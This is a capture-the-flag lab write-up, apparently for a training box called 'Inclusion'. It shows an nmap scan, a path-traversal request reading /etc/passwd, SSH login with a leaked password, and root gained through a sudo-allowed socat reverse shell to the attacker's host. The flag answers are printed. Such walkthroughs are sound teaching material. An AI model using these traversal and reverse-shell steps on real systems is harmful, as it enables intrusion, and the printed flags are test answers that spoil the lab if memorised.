# Root It

### user flag

* Try nmap. I got `ssh` and `http`.

```
┌──(root💀kali)-[~]
└─# nmap -sV 10.10.47.135             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 22:49 +07
Nmap scan report for 10.10.47.135
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

* Try reading linux passwd file.

```
http://10.10.47.135/article?name=etc/passwd
http://10.10.47.135/article?name=../etc/passwd
http://10.10.47.135/article?name=../../etc/passwd
http://10.10.47.135/article?name=../../../etc/passwd (success)
```

```
┌──(root💀kali)-[~]
└─# curl http://10.10.47.135/article?name=../../../etc/passwd
...
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
...

                                                                             
┌──(root💀kali)-[~]
└─# ssh falconfeast@10.10.47.135                       
The authenticity of host '10.10.47.135 (10.10.47.135)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.47.135' (ECDSA) to the list of known hosts.
falconfeast@10.10.47.135's password: (type 'rootpassword' here)
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
...
Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
```

> *Answer:* 60989655118397345799

### root flag
```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

* [Reverse shell with socat](https://gtfobins.github.io/gtfobins/socat/#reverse-shell).

```
┌──(root💀kali)-[~]
└─# socat file:`tty`,raw,echo=0 tcp-listen:12345

falconfeast@inclusion:~$ sudo socat tcp-connect:<kali_ip>:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

* Back to kali.

```
┌──(root💀kali)-[~]
└─# socat file:`tty`,raw,echo=0 tcp-listen:12345
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

<h1 align="center">
  <img src="https://i2.wp.com/media4.giphy.com/media/mQG644PY8O7rG/giphy.gif" style="max-width:600px;">
</h1>

```
# ls /root
root.txt
# cat /root/root.txt
42964104845495153909
```

> *Answer:* 42964104845495153909
